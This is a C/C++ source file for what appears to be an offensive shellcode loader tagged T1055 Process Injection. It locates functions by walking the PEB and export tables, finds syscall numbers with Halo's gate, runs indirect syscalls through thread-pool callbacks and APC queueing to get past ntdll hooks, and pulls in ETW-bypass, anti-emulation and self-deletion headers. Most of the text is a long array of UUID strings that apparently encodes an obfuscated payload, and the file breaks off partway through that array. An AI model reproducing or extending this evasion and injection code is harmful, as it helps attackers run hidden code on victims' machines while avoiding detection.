#include "anti_forensic.h"
#include "self_deletion.h"
#include "sweet_sleep.h"
#include "etw_pass.h"
#include "anti_emu.h"
#include "api_untangle.h"
#include "uuid_converter.h"
/**
Editor: Thomas X Meng
T1055 Process Injection
Proxy indirect sycall
Custom Stack proxy PI (Local Injection) + indirect threadless execution
Added halo's gate support for finding syscall SSN
Avoid calling NtCreateThreadEx
Full stack trace proof
Bypass ntdll API h00ks without patching
Todo: add hash to Halo's gate.
# update support argument -bin position_independent_code.bin as input instead of hardcoded code. 
**/
/***

*/
#include <windows.h>
#include <stdio.h>
#include <winternl.h>


/** original code by: Alice Climent-Pommeret */

void * GetFunctionAddress(const char * MyNtdllFunction, PVOID MyDLLBaseAddress) {

	DWORD j;
	uintptr_t RVA = 0;
	
	//Parse DLL loaded in memory
	const LPVOID BaseDLLAddr = (LPVOID)MyDLLBaseAddress;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) BaseDLLAddr;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) BaseDLLAddr + pImgDOSHead->e_lfanew);

    	//Get the Export Directory Structure
	PIMAGE_EXPORT_DIRECTORY pImgExpDir =(PIMAGE_EXPORT_DIRECTORY)((LPBYTE)BaseDLLAddr+pImgNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    	//Get the functions RVA array
	PDWORD Address=(PDWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfFunctions);

    	//Get the function names array 
	PDWORD Name=(PDWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfNames);

    	//get the Ordinal array
	PWORD Ordinal=(PWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfNameOrdinals);

	//Get RVA of the function from the export table
	for(j=0;j<pImgExpDir->NumberOfNames;j++){
        	if(!strcmp(MyNtdllFunction,(char*)BaseDLLAddr+Name[j])){
			//if function name found, we retrieve the RVA
         		// RVA = (uintptr_t)((LPBYTE)Address[Ordinal[j]]);
                RVA = Address[Ordinal[j]];

			break;
		}
	}
	
    	if(RVA){
		//Compute RVA to find the current address in the process
	    	uintptr_t moduleBase = (uintptr_t)BaseDLLAddr;
	    	uintptr_t* TrueAddress = (uintptr_t*)(moduleBase + RVA);
	    	return (PVOID)TrueAddress;
    	}else{
        	return (PVOID)RVA;
    	}
}


void * DLLViaPEB(wchar_t * DllNameToSearch){

    	PPEB pPeb = 0;
	PLDR_DATA_TABLE_ENTRY pDataTableEntry = 0;
	PVOID DLLAddress = 0;

	//Retrieve from the TEB (Thread Environment Block) the PEB (Process Environment Block) address
    	#ifdef _M_X64
        //If 64 bits architecture
        	PPEB pPEB = (PPEB) __readgsqword(0x60);
    	#else
        //If 32 bits architecture
        	PPEB pPEB = (PPEB) __readfsdword(0x30);
    	#endif

	//Retrieve the PEB_LDR_DATA address
	PPEB_LDR_DATA pLdr = pPEB->Ldr;

	//Address of the First PLIST_ENTRY Structure
    	PLIST_ENTRY AddressFirstPLIST = &pLdr->InMemoryOrderModuleList;

	//Address of the First Module which is the program itself
	PLIST_ENTRY AddressFirstNode = AddressFirstPLIST->Flink;

    	//Searching through all module the DLL we want
	for (PLIST_ENTRY Node = AddressFirstNode; Node != AddressFirstPLIST ;Node = Node->Flink) // Node = Node->Flink is the next module
	{
		// Node is pointing to InMemoryOrderModuleList in the LDR_DATA_TABLE_ENTRY structure.
        	// InMemoryOrderModuleList is at the second position in this structure.
		// To cast in the proper type, we need to go at the start of the structure.
        	// To do so, we need to subtract 1 byte. Indeed, InMemoryOrderModuleList is at 0x008 from the start of the structure) 
		Node = Node - 1;

        	// DataTableEntry structure
		pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)Node;

        	// Retrieve de full DLL Name from the DataTableEntry
        	wchar_t * FullDLLName = (wchar_t *)pDataTableEntry->FullDllName.Buffer;

        	//We lower the full DLL name for comparaison purpose
        	for(int size = wcslen(FullDLLName), cpt = 0; cpt < size ; cpt++){
            		FullDLLName[cpt] = tolower(FullDLLName[cpt]);
        	}

        	// We check if the full DLL name is the one we are searching
        	// If yes, return  the dll base address
        	if(wcsstr(FullDLLName, DllNameToSearch) != NULL){
            		DLLAddress = (PVOID)pDataTableEntry->DllBase;
            		return DLLAddress;
        	}

		// Now, We need to go at the original position (InMemoryOrderModuleList), to be able to retrieve the next Node with ->Flink
		Node = Node + 1;
	}

    	return DLLAddress;
}

/* API retrival end.*/


//define SimpleSleep
void SimpleSleep(DWORD dwMilliseconds);

typedef ULONG (NTAPI *RtlUserThreadStart_t)(PTHREAD_START_ROUTINE BaseAddress, PVOID Context);
RtlUserThreadStart_t pRtlUserThreadStart = NULL;

typedef ULONG (WINAPI *BaseThreadInitThunk_t)(DWORD LdrReserved, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter);
BaseThreadInitThunk_t pBaseThreadInitThunk = NULL;

// deinfe pRtlExitUserThread:
typedef NTSTATUS (NTAPI *pRtlExitUserThread)(
    NTSTATUS ExitStatus
);


typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);

typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtAllocateVirtualMemory;   // pointer to NtAllocateVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID* address;                      // PVOID *BaseAddress - rdx; ULONG_PTR ZeroBits - 0 - r8
    PSIZE_T size;                        // PSIZE_T RegionSize - r9; ULONG AllocationType - MEM_RESERVE|MEM_COMMIT = 3000 - stack pointer
    ULONG permissions;                   // ULONG Protect - PAGE_EXECUTE_READ - 0x20 - stack pointer
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    UINT_PTR pNtWriteVirtualMemory;      // pointer to NtWriteVirtualMemory - rax
    HANDLE hProcess;                     // HANDLE ProcessHandle - rcx
    PVOID address;                       // PVOID BaseAddress - rdx
    PVOID buffer;                        // PVOID Buffer - r8
    SIZE_T size;                         // SIZE_T NumberOfBytesToWrite - r9
    ULONG bytesWritten;
} NTWRITEVIRTUALMEMORY_ARGS, *PNTWRITEVIRTUALMEMORY_ARGS;

typedef struct _RTLTHREADSTART_ARGS {
    UINT_PTR pRtlUserThreadStart;        // pointer to RtlUserThreadStart - rax
    PTHREAD_START_ROUTINE pThreadStartRoutine; // PTHREAD_START_ROUTINE BaseAddress - rcx
    PVOID pContext;                      // PVOID Context - rdx
} RTLTHREADSTART_ARGS, *PRTLTHREADSTART_ARGS;

// typedef struct _BASETHREADINITTHUNK_ARGS {
//     UINT_PTR pBaseThreadInitThunk;       // pointer to BaseThreadInitThunk - rax
//     DWORD LdrReserved;                   // DWORD LdrReserved - rcx
//     LPTHREAD_START_ROUTINE lpStartAddress; // LPTHREAD_START_ROUTINE lpStartAddress - rdx
//     LPVOID lpParameter;                  // LPVOID lpParameter - r8
// } BASETHREADINITTHUNK_ARGS, *PBASETHREADINITTHUNK_ARGS;

typedef struct _BASETHREADINITTHUNK_ARGS {
    UINT_PTR pBaseThreadInitThunk;       // pointer to BaseThreadInitThunk - rax
    LPTHREAD_START_ROUTINE LdrReserved;                   // DWORD LdrReserved - rcx
    DWORD lpStartAddress; // LPTHREAD_START_ROUTINE lpStartAddress - rdx
    LPVOID lpParameter;                  // LPVOID lpParameter - r8
    LPTHREAD_START_ROUTINE GoGetGo;
} BASETHREADINITTHUNK_ARGS, *PBASETHREADINITTHUNK_ARGS;

// typedef NTSTATUS(NTAPI* myNtTestAlert)(
//     VOID
// );

// typedef struct _NTTESTALERT_ARGS {
//     UINT_PTR pNtTestAlert;          // pointer to NtTestAlert - rax
// } NTTESTALERT_ARGS, *PNTTESTALERT_ARGS;

// https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ne-processthreadsapi-queue_user_apc_flags
typedef enum _QUEUE_USER_APC_FLAGS {
  QUEUE_USER_APC_FLAGS_NONE,
  QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
  QUEUE_USER_APC_CALLBACK_DATA_CONTEXT
} QUEUE_USER_APC_FLAGS;

typedef struct _NTQUEUEAPCTHREADEX_ARGS {
    UINT_PTR pNtQueueApcThreadEx;          // pointer to NtQueueApcThreadEx - rax
    HANDLE hThread;                         // HANDLE ThreadHandle - rcx
    HANDLE UserApcReserveHandle;            // HANDLE UserApcReserveHandle - rdx
    QUEUE_USER_APC_FLAGS QueueUserApcFlags; // QUEUE_USER_APC_FLAGS QueueUserApcFlags - r8
    PVOID ApcRoutine;                       // PVOID ApcRoutine - r9
    // PVOID SystemArgument1;                  // PVOID SystemArgument1 - stack pointer
    // PVOID SystemArgument2;                  // PVOID SystemArgument2 - stack pointer
    // PVOID SystemArgument3;                  // PVOID SystemArgument3 - stack pointer
} NTQUEUEAPCTHREADEX_ARGS, *PNTQUEUEAPCTHREADEX_ARGS;

typedef NTSTATUS (NTAPI *NtQueueApcThreadEx_t)(
    HANDLE ThreadHandle,
    HANDLE UserApcReserveHandle, // Additional parameter in Ex2
    QUEUE_USER_APC_FLAGS QueueUserApcFlags, // Additional parameter in Ex2
    PVOID ApcRoutine
);


// WorkCallback functions: 
extern "C" {
    VOID CALLBACK AllocateMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK WriteProcessMemoryCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK RtlUserThreadStartCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK BaseThreadInitThunkCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK BaseThreadInitXFGThunkCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtQueueApcThreadCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
    VOID CALLBACK NtTestAlertCustom(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
}

PVOID getPattern(unsigned char* pattern, SIZE_T pattern_size, SIZE_T offset, PVOID base_addr, SIZE_T module_size)
{
	PVOID addr = base_addr;
	while (addr != (char*)base_addr + module_size - pattern_size)
	{
		if (memcmp(addr, pattern, pattern_size) == 0)
		{
			printf("[+] Found pattern @ 0x%p\n", addr);
			return (char*)addr - offset;
		}
		addr = (char*)addr + 1;
	}

	return NULL;
}

BYTE *findBaseThreadInitXFGThunk(BYTE *pKernel32Base) {

    // Resolve exported BaseThreadInitThunk
    FARPROC pBaseThreadInitThunk = GetProcAddress((HMODULE)pKernel32Base, "BaseThreadInitThunk");

    if (!pBaseThreadInitThunk) {
        printf("[-] Failed to locate BaseThreadInitThunk.\n");
        return NULL;
    }

    printf("[+] Found BaseThreadInitThunk @ %p\n", pBaseThreadInitThunk);

    // mov rcx, r8 = 0x49, 0x8B, 0xC8 for both Windows 10(Server) and 11
    unsigned char mov_rcx_r8_pattern[] = { 0x49, 0x8B, 0xC8 };

    // Scan within next 0x100 bytes for mov rcx, r8
    BYTE *searchStart = (BYTE *)pBaseThreadInitThunk;
    BYTE *patternAddr = (BYTE *)getPattern(mov_rcx_r8_pattern, sizeof(mov_rcx_r8_pattern), 0, searchStart, 0x100);


    if (!patternAddr) {
        printf("[-] Failed to find 'mov rcx, r8' pattern.\n");
        return NULL;
    }

    printf("[+] Found 'mov rcx, r8' at %p\n", patternAddr);

    // Instruction after mov rcx, r8 is 'call rel32' => opcode E8 xx xx xx xx
    BYTE *callInstrAddr = patternAddr + 3;

    if (*callInstrAddr != 0xE8) {
        printf("[-] Expected call instruction not found.\n");
        return NULL;
    } else {
        printf("[+] Found call instruction at %p\n", callInstrAddr);
    }

    // Extract rel32 offset
    INT32 relOffset = *(INT32 *)(callInstrAddr + 1);

    // Calculate absolute address of BaseThreadInitXFGThunk
    BYTE *pXFGThunk = callInstrAddr + 0x5 + relOffset + 0x3;

    printf("[+] Resolved BaseThreadInitXFGThunk @ %p\n", pXFGThunk);

    return pXFGThunk;
}


PVOID findSyscallInstruction(const char* apiName, FARPROC pApi, int occurrence)
{
    if (!pApi) {
        printf("[-] Invalid function pointer passed for %s.\n", apiName);
        return NULL;
    }


    printf("[+] Searching for syscall #%d in %s @ %p\n", occurrence, apiName, pApi);

    const unsigned char syscall_pattern[] = { 0x0F, 0x05 }; //or also checks 0xC3 for ret 
    BYTE* addr = (BYTE*)pApi;
    BYTE* end  = addr + 0x100;

    int found = 0;
    while (addr <= end - sizeof(syscall_pattern)) {
        if (addr[0] == syscall_pattern[0] && addr[1] == syscall_pattern[1]) {
            found++;
            if (found == occurrence) {
                printf("[+] Found syscall #%d for %s at %p\n", occurrence, apiName, addr);
                return addr;
            }
        }
        addr++;
    }

    printf("[-] Only found %d syscall(s), syscall #%d not found for %s\n", found, occurrence, apiName);
    return NULL;
}

extern "C" {
    DWORD SSNAllocateVirtualMemory;
    DWORD SSNProtectVirtualMemory;
    DWORD SSNWriteVirtualMemory;
    DWORD SSNCreateThreadEx;
    DWORD SSNWaitForSingleObject;
}


// Halo's gate syscall
#define UP -32
#define DOWN 32
WORD GetsyscallNum(LPVOID addr) {


    WORD syscall = 0;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        BYTE high = *((PBYTE)addr + 5);
        BYTE low = *((PBYTE)addr + 4);
        syscall = (high << 8) | low;

        return syscall;

    }

    // Detects if 1st, 3rd, 8th, 10th, 12th instruction is a JMP
    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
                syscall = (high << 8) | low - idx;

                return syscall;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * UP);
                BYTE low = *((PBYTE)addr + 4 + idx * UP);

                syscall = (high << 8) | low + idx;

                return syscall;

            }

        }

    }
}


// -bin: 
unsigned char* magic_code = NULL;
SIZE_T allocatedSize = 0; 

 
// UUIDs generated from magic 
    const char* UUIDs[] = {
        "0035c0e8-c000-0035-00cb-b07f27e3346c",
        "5ee95842-40e5-b1d0-9122-adeede73bf42",
        "39f3b3dd-8393-feee-9a00-000000ccb0aa",
        "db596f7f-e914-ab23-30ae-0731790b8b9a",
        "d69d1075-ac76-54ca-4f1b-0312a29e7e3a",
        "54018df4-10b7-0558-756b-522dfb524982",
        "f5e7e26f-4f3a-6f5f-d13d-7022ff85f80d",
        "520018c1-fc17-3f19-fa24-aca4be3b922f",
        "45a6ab96-d9ee-02f3-7c72-4e3bcd57a9d4",
        "76bf04a7-9559-f598-d620-6e33ae66bac4",
        "97c438e9-3540-ea1a-0d9b-c84d22de760b",
        "743deaa0-f7ff-e3d2-e859-f6a60389904a",
        "81890133-3da2-6c14-c212-71159a7f431e",
        "4208b985-e1a7-7b0a-d5cb-6b63effbc858",
        "eded1f12-819e-8258-7e67-3863f46e9ccf",
        "a633a090-fcb9-626c-2416-12fedcee3949",
        "3e0114bf-4c33-2021-7bc6-06a3410459e1",
        "3f635bd9-f1da-3d1c-30ac-5075a457f9ae",
        "23356d8a-c648-972f-0fe8-f9a11231d97d",
        "052a626f-dbe8-d5b6-fbcf-0a51bafca048",
        "bfc2ce50-cb87-d737-febf-2a51d395b8ba",
        "6f35fee5-c661-ef54-0fb8-05ab8cf9450f",
        "da9ad699-e2a9-a194-cbe2-fef38e719234",
        "43e17b45-d7b1-1c3f-4f9e-2a1078ca5541",
        "6995bdc6-b754-289c-27ba-9845f0cfa2cd",
        "854078fd-aef6-55ac-8352-df5d939d05dd",
        "d571bca3-4963-9bd7-558f-3c7594ccdaf7",
        "08fc52f0-cabc-a9fd-4b72-9f3f112ce3e5",
        "0926764c-036d-2fec-f0c2-25c37b2d157d",
        "bfdd79b8-14a9-2009-8dfe-910920a9b45f",
        "1fe103dd-3cfa-c723-0880-88a53fd86862",
        "43d94824-9350-f985-8389-4b232448d279",
        "7986b54f-3aed-b7df-6d86-493a783c4553",
        "e77db1db-0fb1-d79d-7a31-0e83b9de9b66",
        "54cd1f60-ca1a-1c5d-0469-98d590000000",
        "00000000-0100-0000-0003-000000000000",
        "5700a000-2e50-51ac-57ba-6ef4d9aaa232",
        "58ca6b81-e354-1d63-fea4-f552ee5a961c",
        "ac600511-2d28-0745-e34e-efcd9e65e882",
        "ffe9f3fa-5599-fc5a-aa17-61aa806271c4",
        "8a885f78-69d2-1e84-39b0-4db4b88719d4",
        "c2d38c03-4dd9-5ffd-6a3c-8d424af0688d",
        "5519d1e3-781a-d133-5c43-681ea244682f",
        "75cb860a-022f-8daf-e918-6f3199729c5b",
        "11d62218-d64e-48b4-dea7-21c731b3da54",
        "3307bb88-ed7d-7160-7662-60632c662ae1",
        "801925a5-4735-7e0b-243f-408b1766c2d0",
        "cdcb6d64-ef8e-11e3-3668-c00ecc9629e9",
        "54713b85-f0cc-a56f-7173-6784cc9a08fe",
        "8a3900b1-c544-fe53-0efe-5c0ba1ed20c1",
        "35f4d67e-f48b-2666-727f-73173b8fbdfe",
        "f3acd919-d1a4-ef4d-572c-66ad399b1484",
        "dcd7b185-7afc-2f77-76c8-e37e61cd048f",
        "4ca62d06-116f-3c89-83e8-4f68d57535b5",
        "d69c9aad-3b6d-1637-0636-b52bd78ca2e3",
        "4968c6ef-a3a4-46ba-ff1d-1e71a6587f49",
        "b090c8d4-85aa-c89b-f0de-bb059c933264",
        "7669d5f0-1032-9052-42f4-d51edbeb3451",
        "644c7eca-0bdb-7784-d89a-3ae4a0a8f59f",
        "ce3036df-008a-b32a-10bc-40652442c5a6",
        "d4f5a1dd-636b-5ce5-ad84-66235fe91452",
        "725b80c2-9fe8-439d-170f-a4f046f0f2e6",
        "c36437a5-4c91-86c8-ba59-ce07c30a9730",
        "0b4703e5-a9ae-5036-3992-973122926f5e",
        "d278fea1-dcdd-5026-96c2-8dc877e39e9a",
        "1eb50d67-2afb-b1ac-061b-7ca764ad1639",
        "fd1ed399-0079-e6b8-49b9-0fa6bc12917d",
        "653c5e68-8cad-f785-d358-68f2b75a3b30",
        "0f75963e-0cb6-9843-a712-d3246bd65a44",
        "19220f50-a6d6-b03d-5e80-7396a7d92048",
        "abb4c998-bc0d-0794-721b-2088cb9dfde0",
        "1d216521-9ece-7155-aa47-802f2829aaa4",
        "f6060d9e-c222-6e92-8baf-bcf622c2be52",
        "b99e392b-cb9c-3469-4bb7-dd1ee9040edb",
        "1281b0a7-d0c7-659a-effc-d1769eef86c9",
        "dfc9f252-c7b5-9261-3df8-00e08c177e6b",
        "934b607d-c691-1b95-57e9-8a3392e62c1e",
        "5563fd09-09d9-446f-bf8a-509493c64753",
        "684663d1-6412-bfb2-3137-cc8268249dc6",
        "b2d54d84-bebc-b5fc-dc98-e0407965e5da",
        "21f6d63b-bb72-4218-4c49-4f577800d20a",
        "56f514f0-360b-b5bf-54b6-180352fe3a7e",
        "a3d0302d-53bd-4cff-058b-93c15ffe9fe8",
        "38479110-42d5-5bca-d877-37176bbcbc5c",
        "196307e7-69e9-8963-1905-1479d1a9e03b",
        "12cc7619-69a8-9560-0e04-6b0c23370f03",
        "43b0d9bd-e02d-06a5-bab8-edf00142a59b",
        "8962f151-fb27-2eea-c03b-616e705313ca",
        "3a68fd02-05a1-01be-bd04-a77415b42f11",
        "e93ec2f4-f6ab-0f3f-5294-81f95578118e",
        "5c09c388-cae9-7c48-82de-0b5aee5c5b19",
        "554200e8-bb30-1bfb-835b-a05528a3bf52",
        "eb9f18c3-db4b-6f88-bb45-4e3b21641d8a",
        "6563b8a6-e3fc-a2d2-6c55-83ea1c568c3d",
        "2cc76105-7b82-be3e-c293-287b10b43321",
        "7f7688c4-12c1-5825-cb78-ed0ebfde32e5",
        "3848b1e1-6278-6c95-de8d-f31af702daa8",
        "5104c3e2-21f1-4841-ba46-40b64aca4ab7",
        "02d4bee5-8ab1-ab19-c61d-0f9a53fbf076",
        "bdbb0aa1-3a3b-a8b8-0645-847ec95a1890",
        "6b4bf090-82cc-fa9c-5590-e911b11e4970",
        "f09ac563-19a3-73e4-6069-a73b41dc9de1",
        "a4d64b02-b6db-f9e5-1004-a6901ed20b9d",
        "9fb6568e-01f9-299f-58e7-b445da9b122e",
        "1db7c1f1-bafb-b7a3-9c45-b07a397525d0",
        "aa6096e2-ae2e-92dd-273b-fd37b23549d0",
        "46eba9ad-62b9-cf97-29c0-0122228e2e66",
        "186d1122-e8f5-921b-4f87-876f5cb6176d",
        "6334efe0-33df-7d9d-5c21-306dd5e579e2",
        "55986e7a-6c4e-db7f-dfa8-bc0aabee632d",
        "0048604a-87f2-427b-aae3-5f3d39ab1e74",
        "fef5cd4f-4fef-e112-98ab-58748b591374",
        "932c9f60-2bfc-d8f1-1e0d-a8b379e735c8",
        "de1e816f-6b40-1ba6-2bd9-cdc6c45c3158",
        "c9cd9d20-5b16-1df5-c46a-10c9c44cf6e5",
        "08a06820-2716-5f83-f2a5-6c1ff5b87ec4",
        "4f0348d4-c93c-9198-9d7c-bcdf8863ce11",
        "8db02b53-7a2c-99ce-bed2-da4c37061f4d",
        "693027f4-0954-9380-dc01-68636e75daf9",
        "113d0123-5ff3-872c-5819-73d34e9b551f",
        "d0409c5f-3fc1-9bc4-c7c4-60df2b3a39e2",
        "f34aedd0-6ecd-c207-2724-4650542cc36d",
        "7ff271ba-e0e3-4cb2-7eec-0231100b9eb6",
        "39573fb3-e2ce-08c4-4804-54c75533bba4",
        "9bb43b83-e108-d334-65c6-a6112648c552",
        "dad6f8cb-bef6-e8ff-91c5-ac3c4ee6763d",
        "267456b9-be38-6da3-d9dc-21b7b25e93b5",
        "fdcdd67b-3016-8c9d-d287-50ffe8d83f08",
        "794af116-8d0a-816a-b329-c44ca4200890",
        "fbf0406c-d2a1-ba48-82c7-af6b01dc7107",
        "677b2f16-783b-abab-c41c-546ef956fef8",
        "cd21d0a9-1e27-fd75-ad4e-481859bd30fe",
        "f80e22af-d9da-8302-1919-d1dfca5e04a8",
        "7d6104f0-ec92-6a02-59ec-d45c383a6a54",
        "dbd8e267-28df-4f12-803a-6ac726e2acf9",
        "405f5722-304a-fc95-6b36-75486ae09959",
        "0018a6e1-8653-1c4e-79c0-bfb28cfb1cb2",
        "15d5adc4-1634-38da-19d0-07e9b443024c",
        "e5c16089-c10b-9e86-c3aa-6245f8a0213e",
        "38e1cb2b-78be-3885-ad5b-df4c1fd0ff9e",
        "859eb8ae-b401-b121-9712-b1fe9b226687",
        "200cf828-8e92-87b5-f4c3-21f41ad62a46",
        "8f5a5efc-7ae5-b1d7-2563-535260518331",
        "62cfaed5-84a3-6b89-a463-0145b242facc",
        "1e72a8e6-8876-5e01-5c2e-d057b450f200",
        "35b0031d-672a-d250-92c0-bf42034d3e76",
        "63934710-a8c0-082d-ce50-b76a6c86c6a2",
        "adca9f84-fdeb-7334-23ff-2674bcd02cf6",
        "5b31e251-54d3-bb95-fab9-67c6efba6fde",
        "ac036c1c-53ca-f80e-542d-b4b64f085721",
        "c975b872-f980-2169-f75a-315c3e889830",
        "1b013bc8-05b3-47a2-e0a7-f6c9d5ca785b",
        "c5d0c65d-7e1d-a21c-25ce-6bc14c69d1ce",
        "620a9ace-d41d-003b-d3ea-0656b28f7b20",
        "58262be0-6b66-1890-4dac-b658e7834b59",
        "bae412a9-77d6-e05b-1d0d-1dd980f349a7",
        "635299b2-b562-4e90-ee31-a2895b0a0dfb",
        "c1191466-642c-e45d-5b52-eab603292591",
        "309bc9a2-c3f8-8611-6571-859d4e267483",
        "e4c5d580-54c3-f328-444f-c16f44a558fd",
        "ce44d284-b331-9b61-5d14-82ea9fff4015",
        "ed639964-e383-d106-0beb-3e76da372b5a",
        "9c5cd3c6-4cb0-d338-5876-8804e46fbf10",
        "9efdd0d3-93a2-e3a7-bacc-ac377ea7a637",
        "616faaac-af6d-8b22-60ec-cef9bc6a61d7",
        "cb1b3ded-5423-df97-773d-53578f4bb0ef",
        "c4d8e40b-d40f-f504-79fc-fe1ffa5c530a",
        "26eb2f8f-58a5-b151-aa61-29f7fb7e6fd4",
        "c6eba727-d1a3-3643-2ee6-180c559bcc84",
        "e721999d-44aa-2201-6c20-ce5d58b7c80f",
        "0d5f493d-f1c4-84e5-24ab-924a2007d419",
        "ed01b590-b78c-9261-477d-701386642de7",
        "7450fb1d-1e5a-b3d8-30d1-419fd17cdc18",
        "0c9fba15-5942-849c-6301-632d01607109",
        "50cd2b0f-a735-e808-8193-492b09532bf8",
        "25b048a1-0614-1b8a-897a-db395f46728d",
        "4c3ac118-a414-eb45-91aa-8c6cc184f462",
        "bee0fdb8-4530-0dcc-c207-515e17b02e10",
        "339c2f1a-0592-1aa3-c66e-1d512948649f",
        "09e4ef4a-d711-a53a-66ca-dbc9d414bdce",
        "b619c54a-b04a-2577-ae28-e049a5067db5",
        "2c6c5bd6-a78d-d4e7-83d8-b77b91ef35de",
        "d5858f02-88c7-2282-5eca-a2541d9e4b2d",
        "625340b4-3104-ba35-532a-a4afb1139d4c",
        "3fd73866-abae-9bb3-21ef-f2758e5e7a37",
        "6d1d1ce6-1a32-bf26-becc-6361e3fa3eb9",
        "f1c2fcb8-db70-e7ce-c9c8-70f75ca51303",
        "6eb39610-fb67-2bfb-b5b1-3c4cb81592c4",
        "08d3154f-9dd5-3e0e-9d1f-7dafc720260c",
        "5b9e8461-b4dc-e1b6-1ad6-ac434e8856d6",
        "992f40f0-a4f3-6667-44da-1a255dbee3d0",
        "a0ddcd87-19ba-d949-4bf9-548e682348c0",
        "e892be38-8e17-6b16-732f-84d3feb23ccf",
        "8019450f-c265-ad80-8f4d-27ebca8840fc",
        "5ea1cd65-79ef-edc1-900d-d50fa8d09aa5",
        "0f57ea76-debd-56d6-afa2-c7af8958e402",
        "1f6fa3f3-4e18-1372-63d7-451e376de506",
        "24b99cf6-3cdc-b747-3fc5-826010c91c3a",
        "c21efe5b-c48e-97e0-e4a6-924da0a23097",
        "a7294d79-c174-b67d-38a1-b61620b58b72",
        "9de04960-2fbc-d324-f03e-f558d331095a",
        "932530f2-2103-9d9d-60ce-545bb58f7621",
        "99a5a9d8-2d5c-f434-8399-f4270c9e803d",
        "226c62ea-790d-720a-984e-c90ad4e0eaea",
        "9b567951-ee2a-2257-f04b-13dd52dbad6a",
        "8b3b9dec-1797-eaed-969b-8af143d31634",
        "62dcfdcc-f5ed-9a7e-c884-99867e791296",
        "217efdae-b690-4418-a104-930182875a54",
        "43c2cd84-13fd-db94-c067-51b84cd5c87c",
        "2f57712f-0fc4-96c0-088d-7a6cc4b12063",
        "dcb343e9-6eb5-cd6d-ef5a-5fd082624bc5",
        "5888b4f7-ea4c-f78f-e4f6-8c1af12361ca",
        "496b586c-6355-948c-ea23-86f4c6b5ab14",
        "f5527466-0fc7-2506-e8b9-b3858c6eca74",
        "ae6ed564-765c-eb2a-ae6e-194f1431e9d8",
        "ff634605-737b-da6d-09df-2e2574fe4725",
        "3509513c-3858-2d7a-2515-09e744aaac46",
        "96fa2673-ec06-9740-2c73-baaf4f6e8446",
        "edb0d1a8-2193-4f5e-39d4-ce3cecfbd0ce",
        "fee547bd-67ee-c0b9-3e03-ef74ea6e1a4a",
        "3a51ac1a-e60a-d981-489e-eb560839638d",
        "bfc2a7f0-dfd7-72d9-088c-59ae459ab903",
        "fbb42245-c64b-298d-6538-4e042e1ad274",
        "767ff92b-ef64-c9ab-97ed-fa4eecb5daa3",
        "d3f0bb01-a578-ad9b-6987-fff874f83d43",
        "88827321-10ce-2aa0-ffcb-73020e6aad89",
        "17b46dca-7329-70fa-a26c-1eeade63c50b",
        "0a29f791-331e-956b-0208-31f7d0b55518",
        "e7073187-145d-528b-7e0e-16e864fcaee9",
        "b8d3d3aa-8ff8-9fce-60f6-87c4e3c9395e",
        "8988f009-3b76-3d52-af15-89aeb3538e46",
        "350a6ed8-dcd7-6748-6f29-dab0fb17174c",
        "dbd0f40b-9b12-4bee-6ccb-cbe8f0a8d01f",
        "0d78ca72-ffa4-fed0-9483-263eb99f5b89",
        "330dc531-8dbc-6370-f931-2e2de2b4425b",
        "05930858-13a6-fad0-d6ca-c4c99888c640",
        "7c3d8230-96da-d08f-17d8-74b11dea4585",
